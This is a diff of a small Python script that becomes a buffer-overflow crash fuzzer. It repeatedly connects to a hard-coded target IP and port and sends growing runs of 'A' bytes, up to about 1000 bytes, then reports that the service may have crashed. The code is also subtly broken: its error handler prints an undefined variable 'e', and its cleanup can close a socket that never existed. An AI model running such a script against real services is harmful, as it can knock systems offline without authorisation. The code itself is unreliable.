@@ -1,21 +1,24 @@
 import socket
+import sys
 
-# IP and port of the target
 target_ip = "1.0.0.0"
 target_port = 80
 
-# Creating a socket object
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-# Connecting to the target
-s.connect((target_ip, target_port))
-
-# Crafting the attack
-# 'A' is just a placeholder for the actual bytes an attacker would send.
-# In a real attack, this would be carefully crafted data that exploits
-# a specific vulnerability in the target system.
-buf = b"A" * 1000
-
-# Sending the attack payload
-s.send(buf)
-s.close()
+buffer = ['\x41']
+counter = 100
+while len(buffer) <= 10:
+    buffer.append('\x41' * counter)
+    counter += 100
+try:
+    for string in buffer:
+        print(f'[+] Sending {len(string)} bytes...')
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip,target_port))
+        s.recv(1024)
+        s.send((string + '\r\n').encode())
+        print ('[+] Done')
+except:
+    print(f'[!] Unable to connect to the application. Reason: {e}. You may have crashed it.')
+    sys.exit(0)
+finally:
+	s.close()
